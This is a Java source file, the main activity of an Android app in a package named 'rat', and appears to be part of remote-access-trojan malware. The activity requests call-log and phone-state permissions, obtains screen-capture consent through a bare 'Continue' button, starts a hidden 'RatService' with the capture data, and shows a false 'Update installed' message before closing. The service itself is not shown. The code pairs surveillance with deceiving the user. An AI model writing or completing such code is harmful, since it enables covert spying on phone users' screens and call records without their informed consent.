package com.local.rat;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.Toast;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {
    private static final int REQ_PERMS = 100;
    private static final int REQ_PROJ  = 101;
    private MediaProjectionManager mpm;

    @Override
    protected void onCreate(@Nullable Bundle b) {
        super.onCreate(b);
        AppCtx.init(this);

        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        Button btn = new Button(this);
        btn.setText("Continue");
        ll.addView(btn);
        setContentView(ll);

        String[] perms = new String[]{
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.POST_NOTIFICATIONS
        };
        boolean missing = false;
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                missing = true; break;
            }
        }
        if (missing) ActivityCompat.requestPermissions(this, perms, REQ_PERMS);

        mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);

        btn.setOnClickListener(v -> {
            if (mpm != null) startActivityForResult(mpm.createScreenCaptureIntent(), REQ_PROJ);
        });
    }

    @Override
    protected void onActivityResult(int req, int res, @Nullable Intent data) {
        super.onActivityResult(req, res, data);
        if (req == REQ_PROJ && res == Activity.RESULT_OK && data != null) {
            Intent svc = new Intent(this, RatService.class);
            svc.setAction(RatService.ACTION_START);
            svc.putExtra(RatService.EXTRA_RESULT_CODE, res);
            svc.putExtra(RatService.EXTRA_RESULT_DATA, data);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
            else startService(svc);
            Toast.makeText(this, "Update installed", Toast.LENGTH_SHORT).show();
            finish();
        }
    }
}
